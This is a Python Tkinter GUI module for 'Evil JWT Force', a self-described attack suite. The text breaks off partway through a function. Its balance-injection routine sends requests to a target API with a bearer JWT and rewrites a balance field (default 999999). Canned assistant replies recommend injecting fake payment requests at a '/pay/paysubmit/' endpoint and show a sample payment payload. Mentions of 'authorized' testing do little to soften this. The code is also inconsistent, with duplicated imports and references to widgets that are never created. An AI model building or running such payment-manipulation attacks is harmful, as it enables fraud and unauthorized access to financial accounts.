#!/usr/bin/env python3
"""
EVIL_JWT_FORCE - AI Interface Module
GUI interface for the AI-driven JWT security testing framework.
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import subprocess
import threading
import json
import os
import sys
from pathlib import Path
from datetime import datetime
from PIL import Image, ImageTk
import logging
import inspect
import re
import time

# Adicionar o diretório raiz ao path para importações relativas
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

try:
    from ai_module.chat_manager import ChatManager
    AI_MODULE_AVAILABLE = True
except ImportError as e:
    print(f"Erro ao importar ai_module: {e}")
    AI_MODULE_AVAILABLE = False
    ChatManager = None

import ast

# Importações adicionadas pelo patch
import sys
from pathlib import Path

# Adicionar o diretório raiz ao path para importações relativas
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

# Importar módulos necessários para os ataques
try:
    from modules.jwt_utils_simple import decode_token_parts, extract_parts, is_jwt, generate_token
    from modules.jwt_decrypt import JWTDecrypt
    from modules.token_bruteforce import TokenBruteforcer
    from modules.scan_target import TargetScanner
    from modules.fuzz_jwt import JWTFuzzer
    from modules.crypto_utils import encrypt_aes, decrypt_aes, hash_sha256, hash_sha512, hash_md5, generate_iv, MODES
    import base64
    from hashlib import sha256
    
    HAS_ATTACK_MODULES = True
    print("Módulos de ataque carregados com sucesso")
except ImportError as e:
    print(f"Erro ao importar módulos de ataque: {e}")
    HAS_ATTACK_MODULES = False
# Add the parent directory to sys.path to import from ai_system
current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
sys.path.insert(0, parent_dir)

# Import AI system components
try:
    from ai_system.engine import AIEngine
    from ai_module.jwt_predictor import JWTPredictor
    from ai_module.adaptive_fuzzer import AdaptiveFuzzer
    HAS_AI_MODULES = True
except ImportError as e:
    print(f"Error importing AI modules: {str(e)}")
    HAS_AI_MODULES = False

class AIConsole(scrolledtext.ScrolledText):
    """Custom console widget for displaying AI output"""
    
    def __init__(self, parent, **kwargs):
        kwargs.setdefault("bg", "#000000")
        kwargs.setdefault("fg", "#00FF00")
        kwargs.setdefault("font", ("Consolas", 10))
        kwargs.setdefault("wrap", tk.WORD)
        super().__init__(parent, **kwargs)
        self.config(state=tk.DISABLED)
    
    def write(self, text, tag=None):
        """Write text to the console with optional tag"""
        self.config(state=tk.NORMAL)
        if tag:
            self.insert(tk.END, text, tag)
        else:
            self.insert(tk.END, text)
        self.see(tk.END)
        self.config(state=tk.DISABLED)
    
    def clear(self):
        """Clear the console"""
        self.config(state=tk.NORMAL)
        self.delete(1.0, tk.END)
        self.config(state=tk.DISABLED)


class EvilJWTAIInterface:
    """Main GUI class for the Evil-Force-JWT AI Interface"""
    
    def __init__(self, master):
        """Initialize the AI interface"""
        super().__init__()
        self.master = master
        self.master.title("Evil JWT Force AI")
        self.master.geometry("1200x800")
        self.master.configure(bg="#1e1e1e")
        self.master.resizable(True, True)
        
        # Inicializar história da conversa
        self.conversation_history = []
        
        # Inicializar ai_console como None ou um objeto placeholder até ser configurado na UI
        self.ai_console = None
        
        # Carregar configurações
        self.config = {}
        self.load_config()
        
        # Inicializar componentes de IA
        self.initialize_ai_components()
        
        # Configurar UI
        self.setup_ui()
        
        # Bindings
        self.master.bind("<Return>", self.send_chat_message)
            
    def load_config(self):
        """Carregar configurações salvas"""
        try:
            config_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "config")
            config_file = os.path.join(config_dir, "ai_config.json")
            
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    config = json.load(f)
                
                # Carregar token HuggingFace
                if "hf_token" in config and config["hf_token"]:
                    os.environ["HF_TOKEN"] = config["hf_token"]
                    logger = logging.getLogger('AI_INTERFACE')
                    logger.info("Token HuggingFace carregado com sucesso")
                
                # Carregar API Key OpenAI
                if "openai_api_key" in config and config["openai_api_key"]:
                    os.environ["OPENAI_API_KEY"] = config["openai_api_key"]
                    logger = logging.getLogger('AI_INTERFACE')
                    logger.info("API Key OpenAI carregada com sucesso")
                
                # Salvar configurações para uso posterior
                self.config = config
        
        except Exception as e:
            logger = logging.getLogger('AI_INTERFACE')
            logger.error(f"Erro ao carregar configurações: {str(e)}")
            self.config = {}
    
    def setup_ui(self):
        """Setup the user interface"""
        self.master.configure(bg="#1e1e1e")
        self.main_frame = tk.Frame(self.master, bg="#1e1e1e")
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Setup components with gray tones
        # self.setup_header()  # Commented out as method doesn't exist yet
        self.setup_main_content()
        self.setup_floating_chat()
        self.setup_footer()

        # Initialize AI components
        self.initialize_ai_components()
    
    def setup_main_content(self):
        """Setup the main content area with grouped notebook tabs"""
        self.notebook = ttk.Notebook(self.main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        # Dashboard group
        self.dashboard_tab = tk.Frame(self.notebook, bg="#2d2d2d")
        self.notebook.add(self.dashboard_tab, text="Dashboard")
        self.setup_dashboard_tab()

        # Analyses group
        self.analysis_tab = tk.Frame(self.notebook, bg="#2d2d2d")
        self.notebook.add(self.analysis_tab, text="Análises")
        self.setup_analysis_tab()

        # Attacks group
        self.attacks_tab = tk.Frame(self.notebook, bg="#2d2d2d")
        self.notebook.add(self.attacks_tab, text="Ataques")
        self.setup_attacks_tab()

        # Pipeline group
        self.pipeline_tab = tk.Frame(self.notebook, bg="#2d2d2d")
        self.notebook.add(self.pipeline_tab, text="Pipeline")
        self.setup_pipeline_tab()

        # Reports group
        self.report_tab = tk.Frame(self.notebook, bg="#2d2d2d")
        self.notebook.add(self.report_tab, text="Relatórios")
        self.setup_report_tab()

        # Settings group
        self.settings_tab = tk.Frame(self.notebook, bg="#2d2d2d")
        self.notebook.add(self.settings_tab, text="Configurações")
        self.setup_settings_tab()
    
    def setup_floating_chat(self):
        """Setup the floating chat panel on the right with 3:10 width ratio, ensuring no overlap"""
        self.chat_panel_frame = ttk.Frame(self.main_frame, padding=10)
        # Place chat panel fixed on right side with 3:10 width and full height
        self.chat_panel_frame.place(relx=1.0, rely=0.0, anchor="ne", relwidth=0.3, relheight=1.0)

        # Chat title
        chat_title = ttk.Label(self.chat_panel_frame, text="Chat com IA", style="H1.TLabel")
        chat_title.pack(side="top", fill="x", pady=(0, 5))

        # Chat display area with message bubbles
        self.chat_display_frame = tk.Frame(self.chat_panel_frame, bg="#2d2d2d")
        self.chat_display_frame.pack(side="top", fill="both", expand=True, padx=5, pady=5)

        self.chat_canvas = tk.Canvas(self.chat_display_frame, bg="#2d2d2d", highlightthickness=0)
        self.chat_scrollbar = ttk.Scrollbar(self.chat_display_frame, orient="vertical", command=self.chat_canvas.yview)
        self.chat_scrollable_frame = tk.Frame(self.chat_canvas, bg="#2d2d2d")

        self.chat_scrollable_frame.bind("<Configure>", lambda e: self.chat_canvas.configure(scrollregion=self.chat_canvas.bbox("all")))
        self.chat_canvas.create_window((0, 0), window=self.chat_scrollable_frame, anchor="nw")
        self.chat_canvas.configure(yscrollcommand=self.chat_scrollbar.set)

        self.chat_canvas.pack(side="left", fill="both", expand=True)
        self.chat_scrollbar.pack(side="right", fill="y")

        # Chat input frame
        chat_input_wrapper = tk.Frame(self.chat_panel_frame, bg="#2d2d2d")
        chat_input_wrapper.pack(fill=tk.X, padx=10, pady=10)

        self.chat_entry = tk.Entry(
            chat_input_wrapper,
            font=("Consolas", 11),
            bg="#3c3c3c",
            fg="#ffffff",
            insertbackground="#ffffff",
            relief=tk.FLAT,
            state=tk.NORMAL
        )
        self.chat_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        self.chat_entry.bind("<Return>", self.send_chat_message)
        self.chat_entry.focus_set()

        send_btn = ttk.Button(
            chat_input_wrapper,
            text="Enviar",
            command=self.send_chat_message,
            style='Rounded.TButton'
        )
        send_btn.pack(side=tk.LEFT)

        # Welcome message
        self.add_chat_message("Assistente", "Olá! Estou pronto para ajudar com seus testes de segurança. Como posso ajudar?", "assistant")
    
    def send_chat_message(self, event=None):
        """Send a chat message"""
        message = self.chat_entry.get().strip()
        if message:
            self.add_chat_message("Você", message, "user")
            self.chat_entry.delete(0, tk.END)
            response = self.process_chat_message(message)
            self.add_chat_message("Assistente", response, "assistant")
    
    def process_chat_message(self, message):
        if not message.strip():
            return
        
        self.add_chat_message("Você", message, "user")
        
        if not hasattr(self, 'chat_manager') or self.chat_manager is None:
            self.add_chat_message("Assistente", "Desculpe, o sistema de IA não está inicializado. Por favor, verifique as configurações.", "error")
            return
        
        try:
            if hasattr(self, 'ai_console') and self.ai_console is not None:
                self.ai_console.write("Tentando conexão com a API de IA...\n", "info")
            max_retries = 5
            for attempt in range(max_retries):
                try:
                    if hasattr(self, 'ai_console') and self.ai_console is not None:
                        self.ai_console.write(f"Tentativa {attempt+1}/{max_retries} de conexão com a API.\n", "info")
                    response = self.chat_manager.send(message)
                    if response:
                        if hasattr(self, 'ai_console') and self.ai_console is not None:
                            self.ai_console.write("Conexão bem-sucedida com a API. Resposta recebida.\n", "success")
                        self.add_chat_message("Assistente", response, "assistant")
                        return response
                    else:
                        if hasattr(self, 'ai_console') and self.ai_console is not None:
                            self.ai_console.write("Resposta vazia recebida da API. Tentando novamente...\n", "warning")
                except Exception as e:
                    if hasattr(self, 'ai_console') and self.ai_console is not None:
                        self.ai_console.write(f"Erro na tentativa {attempt+1}/{max_retries}: {str(e)}\n", "error")
                    if attempt == max_retries - 1:
                        if hasattr(self, 'ai_console') and self.ai_console is not None:
                            self.ai_console.write("Todas as tentativas de conexão com a API falharam. Verifique sua conexão de rede e a chave da API.\n", "error")
                        self.add_chat_message("Assistente", "Desculpe, não foi possível conectar à API de IA após várias tentativas. Verifique sua conexão de rede e a chave da API.", "error")
                        return "Desculpe, não foi possível conectar à API de IA após várias tentativas. Verifique sua conexão de rede e a chave da API."
                    import time
                    time.sleep(3)  # Aguardar mais tempo antes de tentar novamente
        except Exception as e:
            error_msg = f"Erro crítico ao processar mensagem: {str(e)}"
            print(error_msg)
            if hasattr(self, 'ai_console') and self.ai_console is not None:
                self.ai_console.write(f"Erro crítico: {error_msg}\n", "error")
            self.add_chat_message("Assistente", "Desculpe, ocorreu um erro crítico ao processar sua mensagem. Verifique os logs para mais detalhes.", "error")
            return "Desculpe, ocorreu um erro crítico ao processar sua mensagem. Verifique os logs para mais detalhes."
    
    def get_default_response(self, message):
        """Return a default response based on the message content"""
        message_lower = message.lower()
        if "jwt" in message_lower or "token" in message_lower:
            return "Desculpe, a API de IA não está disponível no momento. Posso ajudar com a análise de tokens JWT. Por favor, use a aba 'Análise de Token' para inserir um token e obter detalhes sobre ele. Como mais posso ajudar?"
        elif "saldo" in message_lower or "injeção" in message_lower or "pagamento" in message_lower:
            return "Desculpe, a API de IA não está disponível no momento. Posso ajudar com testes de injeção de saldo ou pagamento. Use as abas 'Injeção de Saldo' ou 'Pipeline de Injeção de Pagamento' para configurar e executar seus testes. Como mais posso ajudar?"
        elif "varredura" in message_lower or "alvo" in message_lower or "scan" in message_lower:
            return "Desculpe, a API de IA não está disponível no momento. Posso ajudar com varreduras de alvos. Use a aba 'Varredura de Alvo' para configurar e iniciar uma varredura. Como mais posso ajudar?"
        elif "manual" in message_lower or "ataque" in message_lower:
            return "Desculpe, a API de IA não está disponível no momento. Posso ajudar com ataques manuais. Use a aba 'Ataque Manual' para configurar e executar um ataque personalizado. Como mais posso ajudar?"
        elif "configura" in message_lower or "setting" in message_lower or "api key" in message_lower or "chave" in message_lower:
            return "Desculpe, a API de IA não está disponível no momento. Para configurar sua chave de API ou outras configurações, use a aba 'Configurações'. Verifique se a chave da API da OpenAI está corretamente configurada no ambiente. Como mais posso ajudar?"
        elif "oi" in message_lower or "olá" in message_lower or "hey" in message_lower or "hello" in message_lower:
            return "Olá! Desculpe, a API de IA não está disponível no momento. Estou usando respostas padrão. Como posso ajudar com seus testes de segurança ou análises de JWT?"
        else:
            return "Desculpe, a API de IA não está disponível no momento. Estou usando uma resposta padrão. Como posso ajudar com seus testes de segurança ou análises de JWT?"
    
    def _analyze_burp_data(self, message):
        """Analyze intercepted data from Burp Suite to identify endpoints and URLs."""
        return "Analisando dados interceptados do Burp Suite em tempo real... (Nota: Por favor, forneça os dados ou logs reais para análise detalhada. Com base em dados de referência, sugiro focar em endpoints como '/pay/paysubmit/' para injeção de solicitações de pagamento para alterar o saldo no frontend. Vulnerabilidades potenciais incluem manipulação de valores, falsificação de tokens e adulteração de parâmetros. Teste manualmente no seu ambiente autorizado.) Endpoints potenciais identificados para teste. Por favor, verifique manualmente."
    
    def _generate_advanced_payload(self, message):
        """Generate advanced payloads for testing vulnerabilities."""
        return "Gerando payload avançado para teste... (Nota: Este é um payload teórico baseado em vulnerabilidades comuns e dados de referência, focado em injeção de solicitações de pagamento falsas. Adapte e teste manualmente no seu ambiente autorizado.) Exemplo de payload para injeção de pagamento: {'action': 'balance_injection', 'value': '999999', 'endpoint': '/pay/paysubmit/500', 'parameters': {'siteCode': '500', 'token': 'replace_with_valid_token', 'currency': 'BRL', 'amount': '999999'}}"
    
    def _general_chat_analysis(self, message):
        """General chat analysis with focus on security testing recommendations."""
        return "Processando sua solicitação... Posso ajudar com análises teóricas e recomendações para testes de segurança. Com base em dados de referência, considere testar endpoints de pagamento para injeção de solicitações falsas para alterar o saldo no frontend. Foque em vulnerabilidades como manipulação de valores, falsificação de tokens e adulteração de parâmetros. Para ataques reais em URLs cegas com dados em tempo real do Burp Suite, por favor, execute manualmente no seu ambiente de teste autorizado. Como posso ajudar mais?"
    
    def add_chat_message(self, sender, message, tag_type="assistant"):
        """Add a message to the chat display with bubble style like WhatsApp/Telegram"""
        # Create a frame for the message bubble
        bubble_frame = tk.Frame(self.chat_scrollable_frame, bg="#2d2d2d")
        bubble_frame.pack(fill=tk.X, padx=5, pady=2, anchor="w" if tag_type == "user" else "e")

        # Configure bubble style based on sender
        bg_color = "#3c3c3c" if tag_type == "user" else "#4a4a4a"
        fg_color = "#ffffff"
        anchor_side = "left" if tag_type == "user" else "right"
        max_width = 250  # Approximate width for wrapping

        # Sender label
        sender_label = tk.Label(
            bubble_frame,
            text=sender,
            font=("Segoe UI", 10, "bold"),
            fg=fg_color,
            bg=bg_color
        )
        sender_label.pack(side=anchor_side, padx=5)

        # Message text
        message_text = tk.Text(
            bubble_frame,
            wrap=tk.WORD,
            font=("Segoe UI", 10),
            bg=bg_color,
            fg=fg_color,
            bd=0,
            padx=5,
            pady=5
        )
        message_text.pack(side=anchor_side, fill=tk.X, padx=(10, 5), pady=(0, 5))
        message_text.insert(tk.END, message)
        message_text.config(state=tk.DISABLED)

        # Adjust width based on content
        message_text.config(width=min(max_width, len(message) + 10))

        # Auto-scroll to the bottom
        self.chat_canvas.yview_moveto(1.0)
    
    def setup_dashboard_tab(self):
        """Setup the dashboard tab with summary, quick stats, terminal, and model selection"""
        self.dashboard_frame = tk.Frame(self.dashboard_tab, bg="#2d2d2d")
        self.dashboard_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Welcome message or summary
        self.welcome_label = tk.Label(
            self.dashboard_frame,
            text="Bem-vindo ao Evil JWT Force - Suite Avançada de Ataques",
            font=("Arial", 16, "bold"),
            fg="#ffffff",
            bg="#2d2d2d"
        )
        self.welcome_label.pack(pady=20)

        self.summary_text = tk.Text(
            self.dashboard_frame,
            height=10,
            width=80,
            bg="#3c3c3c",
            fg="#ffffff",
            bd=0,
            wrap=tk.WORD,
            padx=10,
            pady=10
        )
        self.summary_text.pack(pady=10)
        self.summary_text.config(state=tk.DISABLED)

        # Quick stats or cards
        self.stats_frame = tk.Frame(self.dashboard_frame, bg="#2d2d2d")
        self.stats_frame.pack(fill=tk.X, pady=10)

        self.create_stat_card("Tokens Analisados", "0", self.stats_frame, 0)
        self.create_stat_card("Alvos Escaneados", "0", self.stats_frame, 1)
        self.create_stat_card("Injeções Realizadas", "0", self.stats_frame, 2)

        # Model selection
        self.model_frame = tk.LabelFrame(
            self.dashboard_frame,
            text="Seleção de Modelo AI",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.model_frame.pack(fill=tk.X, pady=10)

        self.model_var = tk.StringVar(value="OpenAI")
        models = ["OpenAI", "Ollama", "HuggingFace", "Custom", "Llama"]
        self.model_menu = ttk.OptionMenu(self.model_frame, self.model_var, "OpenAI", *models, command=self.reinitialize_ai_components)
        self.model_menu.pack(side=tk.LEFT, padx=10, pady=10)

        # Terminal section
        self.terminal_frame = tk.LabelFrame(
            self.dashboard_frame,
            text="Terminal",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.terminal_frame.pack(fill=tk.BOTH, expand=True, pady=10)

        self.terminal_text = scrolledtext.ScrolledText(
            self.terminal_frame,
            bg="#333333",
            fg="white",
            font=("Consolas", 10),
            height=10
        )
        self.terminal_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.terminal_text.config(state=tk.DISABLED)

        # Terminal input
        self.terminal_input_frame = tk.Frame(self.terminal_frame, bg="#252525")
        self.terminal_input_frame.pack(fill=tk.X, padx=10, pady=(0, 10))

        self.terminal_entry = tk.Entry(
            self.terminal_input_frame,
            font=("Consolas", 10),
            bg="#3c3c3c",
            fg="white"
        )
        self.terminal_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        self.terminal_entry.bind("<Return>", lambda event: self.execute_terminal_command())

        self.terminal_btn = tk.Button(
            self.terminal_input_frame,
            text="Executar",
            command=self.execute_terminal_command,
            bg="#b00a0a",
            fg="white"
        )
        self.terminal_btn.pack(side=tk.LEFT, padx=(0, 10))
    
    def create_stat_card(self, title, value, parent, column):
        """Create a stat card for dashboard"""
        card_frame = tk.Frame(parent, bg="#3c3c3c", width=150, height=100)
        card_frame.grid(row=0, column=column, padx=10, pady=10, sticky="nsew")

        title_label = tk.Label(
            card_frame,
            text=title,
            font=("Arial", 10, "bold"),
            fg="#ffffff",
            bg="#3c3c3c"
        )
        title_label.pack(pady=5)

        value_label = tk.Label(
            card_frame,
            text=value,
            font=("Arial", 24),
            fg="#ffffff",
            bg="#3c3c3c"
        )
        value_label.pack(pady=5)
    
    def setup_target_scan_tab(self):
        """Setup the target scan tab"""
        # Main container
        self.scan_frame = tk.Frame(self.target_scan_tab, bg="#1e1e1e")
        self.scan_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Target input section
        self.scan_input_frame = tk.LabelFrame(
            self.scan_frame,
            text="Target URL",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.scan_input_frame.pack(fill=tk.X, pady=(0, 20))
        
        # URL entry
        self.url_frame = tk.Frame(self.scan_input_frame, bg="#252525")
        self.url_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.url_label = tk.Label(
            self.url_frame,
            text="Target URL:",
            font=("Arial", 10),
            fg="white",
            bg="#252525"
        )
        self.url_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.url_entry = tk.Entry(
            self.url_frame,
            font=("Consolas", 10),
            bg="#333333",
            fg="white"
        )
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Scan options
        self.scan_options_frame = tk.Frame(self.scan_input_frame, bg="#252525")
        self.scan_options_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        # Output file
        self.output_label = tk.Label(
            self.scan_options_frame,
            text="Output File:",
            font=("Arial", 10),
            fg="white",
            bg="#252525"
        )
        self.output_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.output_entry = tk.Entry(
            self.scan_options_frame,
            font=("Consolas", 10),
            bg="#333333",
            fg="white"
        )
        self.output_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        
        self.output_btn = tk.Button(
            self.scan_options_frame,
            text="Browse",
            command=self.browse_output_file,
            bg="#333333",
            fg="white"
        )
        self.output_btn.pack(side=tk.LEFT)
        
        # Verbose checkbox
        self.verbose_frame = tk.Frame(self.scan_input_frame, bg="#252525")
        self.verbose_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.verbose_var = tk.BooleanVar(value=True)
        self.verbose_check = tk.Checkbutton(
            self.verbose_frame,
            text="Verbose Output",
            variable=self.verbose_var,
            bg="#252525",
            fg="white",
            selectcolor="#333333",
            activebackground="#252525",
            activeforeground="white"
        )
        self.verbose_check.pack(side=tk.LEFT)
        
        # Action buttons
        self.scan_action_frame = tk.Frame(self.scan_input_frame, bg="#252525")
        self.scan_action_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.scan_btn = tk.Button(
            self.scan_action_frame,
            text="Scan Target",
            command=self.scan_target,
            bg="#b00a0a",
            fg="white",
            font=("Arial", 10, "bold"),
            width=15
        )
        self.scan_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        self.clear_scan_btn = tk.Button(
            self.scan_action_frame,
            text="Clear",
            command=self.clear_scan,
            bg="#333333",
            fg="white",
            width=10
        )
        self.clear_scan_btn.pack(side=tk.LEFT)
        
        # Results section - split into top and bottom panes
        self.scan_results_frame = tk.Frame(self.scan_frame, bg="#1e1e1e")
        self.scan_results_frame.pack(fill=tk.BOTH, expand=True)
        
        # Top pane - Scan results
        self.scan_output_frame = tk.LabelFrame(
            self.scan_results_frame,
            text="Scan Results",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.scan_output_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Scan output text
        self.scan_output_text = scrolledtext.ScrolledText(
            self.scan_output_frame,
            bg="#333333",
            fg="white",
            font=("Consolas", 10)
        )
        self.scan_output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.scan_output_text.config(state=tk.DISABLED)
        
        # Bottom pane - Found tokens
        self.tokens_frame = tk.LabelFrame(
            self.scan_results_frame,
            text="Found JWT Tokens",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.tokens_frame.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
        
        self.tokens_listbox = tk.Listbox(
            self.tokens_frame,
            bg="#333333",
            fg="white",
            font=("Consolas", 10),
            height=5
        )
        self.tokens_listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.analyze_token_btn = tk.Button(
            self.tokens_frame,
            text="Analyze Selected Token",
            command=self.analyze_selected_token,
            bg="#b00a0a",
            fg="white"
        )
        self.analyze_token_btn.pack(pady=(0, 10))
        
        # Configure tags for color coding
        self.scan_output_text.tag_configure("header", foreground="#00FFFF", font=("Consolas", 10, "bold"))
        self.scan_output_text.tag_configure("success", foreground="#00FF00")
        self.scan_output_text.tag_configure("warning", foreground="#FFFF00")
        self.scan_output_text.tag_configure("error", foreground="#FF0000")
        self.scan_output_text.tag_configure("info", foreground="#00FFFF")
    
    def setup_balance_injection_tab(self):
        """Setup the balance injection tab"""
        self.balance_frame = tk.Frame(self.balance_injection_tab, bg="#1e1e1e")
        self.balance_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Target input section
        self.balance_input_frame = tk.LabelFrame(
            self.balance_frame,
            text="Target URL",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.balance_input_frame.pack(fill=tk.X, pady=(0, 20))
        
        # URL entry
        self.balance_url_frame = tk.Frame(self.balance_input_frame, bg="#252525")
        self.balance_url_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.balance_url_label = tk.Label(
            self.balance_url_frame,
            text="Target URL:",
            font=("Arial", 10),
            fg="white",
            bg="#252525"
        )
        self.balance_url_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.balance_url_entry = tk.Entry(
            self.balance_url_frame,
            font=("Consolas", 10),
            bg="#333333",
            fg="white"
        )
        self.balance_url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Amount to inject
        self.amount_frame = tk.Frame(self.balance_input_frame, bg="#252525")
        self.amount_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.amount_label = tk.Label(
            self.amount_frame,
            text="Amount to Inject:",
            font=("Arial", 10),
            fg="white",
            bg="#252525"
        )
        self.amount_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.amount_entry = tk.Entry(
            self.amount_frame,
            font=("Consolas", 10),
            bg="#333333",
            fg="white"
        )
        self.amount_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        self.amount_entry.insert(0, "999999")
        
        # JWT Token (optional)
        self.jwt_frame = tk.Frame(self.balance_input_frame, bg="#252525")
        self.jwt_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.jwt_label = tk.Label(
            self.jwt_frame,
            text="JWT Token (optional):",
            font=("Arial", 10),
            fg="white",
            bg="#252525"
        )
        self.jwt_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.jwt_entry = tk.Entry(
            self.jwt_frame,
            font=("Consolas", 10),
            bg="#333333",
            fg="white"
        )
        self.jwt_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Action buttons
        self.balance_action_frame = tk.Frame(self.balance_input_frame, bg="#252525")
        self.balance_action_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.inject_btn = tk.Button(
            self.balance_action_frame,
            text="Inject Balance",
            command=self.execute_balance_injection,
            bg="#b00a0a",
            fg="white",
            font=("Arial", 10, "bold"),
            width=15
        )
        self.inject_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        self.clear_injection_btn = tk.Button(
            self.balance_action_frame,
            text="Clear",
            command=self.clear_balance_injection,
            bg="#333333",
            fg="white",
            width=10
        )
        self.clear_injection_btn.pack(side=tk.LEFT)
        
        # Results section
        self.injection_results_frame = tk.LabelFrame(
            self.balance_frame,
            text="Injection Results",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.injection_results_frame.pack(fill=tk.BOTH, expand=True)
        
        self.injection_results_text = scrolledtext.ScrolledText(
            self.injection_results_frame,
            bg="#333333",
            fg="white",
            font=("Consolas", 10)
        )
        self.injection_results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.injection_results_text.config(state=tk.DISABLED)
        
        # Configure tags for color coding
        self.injection_results_text.tag_configure("success", foreground="#00FF00")
        self.injection_results_text.tag_configure("error", foreground="#FF0000")
        self.injection_results_text.tag_configure("warning", foreground="#FFFF00")
        self.injection_results_text.tag_configure("info", foreground="#00FFFF")
    
    def execute_balance_injection(self):
        """Execute the balance injection attack"""
        # Get input values
        api_url = self.api_url_entry.get().strip()
        method = self.method_var.get()
        token = self.injection_token_entry.get().strip()
        current_balance = self.current_balance_entry.get().strip()
        new_balance = self.new_balance_entry.get().strip()
        balance_field = self.balance_field_entry.get().strip()
        request_body = self.request_body_text.get("1.0", tk.END).strip()
        
        # Check if attack modules are available
        if not HAS_ATTACK_MODULES:
            messagebox.showerror("Error", "Attack modules are not available. Please check the logs.")
            return
        
        # Validate inputs
        if not api_url:
            messagebox.showerror("Erro", "URL da API é obrigatória")
            return
            
        if not token:
            messagebox.showerror("Erro", "Token JWT é obrigatório")
            return
            
        if not new_balance:
            messagebox.showerror("Erro", "Novo valor de saldo é obrigatório")
            return
        
        # Update status
        self.status_msg.set("Executando ataque de injeção de saldo...")
        
        # Clear previous results
        self.update_injection_results("", clear=True)
        self.update_injection_results("Ataque de Injeção de Saldo\n", "info")
        self.update_injection_results(f"Alvo: {api_url}\n", "info")
        self.update_injection_results(f"Método: {method}\n", "info")
        self.update_injection_results(f"Saldo Atual: {current_balance}\n", "info")
        self.update_injection_results(f"Novo Saldo: {new_balance}\n\n", "info")
        
        # Adicionar log para depuração
        print(f"Iniciando ataque de injeção de saldo em {api_url}")
        
        # Run attack in background thread
        def run_attack():
            try:
                import requests
                import json as json_lib
                
                # Prepare headers with JWT token
                headers = {
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json"
                }
                
                # Parse and modify request body
                try:
                    if request_body:
                        body = json_lib.loads(request_body)
                    else:
                        body = {}
                        
                    # Inject new balance value
                    body[balance_field] = float(new_balance) if "." in new_balance else int(new_balance)
                        
                except json_lib.JSONDecodeError:
                    self.master.after(0, lambda: self.update_injection_results(
                        "Erro: JSON inválido no corpo da requisição\n", "error"
                    ))
                    self.master.after(0, lambda: self.status_msg.set("Ataque falhou: JSON inválido"))
                    return
                
                # Execute request
                self.master.after(0, lambda: self.update_injection_results(
                    "Enviando requisição...\n", "info"
                ))
                
                # Make the request based on method
                if method == "GET":
                    response = requests.get(api_url, headers=headers, params=body)
                elif method == "POST":
                    response = requests.post(api_url, headers=headers, json=body)
                elif method == "PUT":
                    response = requests.put(api_url, headers=headers, json=body)
                elif method == "PATCH":
                    response = requests.patch(api_url, headers=headers, json=body)
                
                # Process response
                status_code = response.status_code
                
                # Display status code with color coding
                if 200 <= status_code < 300:
                    status_tag = "success"
                elif 400 <= status_code < 500:
                    status_tag = "warning"
                else:
                    status_tag = "error"
                
                self.master.after(0, lambda: self.update_injection_results(
                    f"Status da Resposta: {status_code}\n\n", status_tag
                ))
                
                # Try to parse response as JSON
                try:
                    response_json = response.json()
                    formatted_json = json_lib.dumps(response_json, indent=2)
                    self.master.after(0, lambda: self.update_injection_results(
                        f"Corpo da Resposta:\n{formatted_json}\n\n", "info"
                    ))
                    
                    # Check if balance field is in response
                    balance_in_response = False
                    if isinstance(response_json, dict):
                        for key, value in response_json.items():
                            if key.lower() == balance_field.lower() or 'balance' in key.lower() or 'saldo' in key.lower():
                                balance_in_response = True
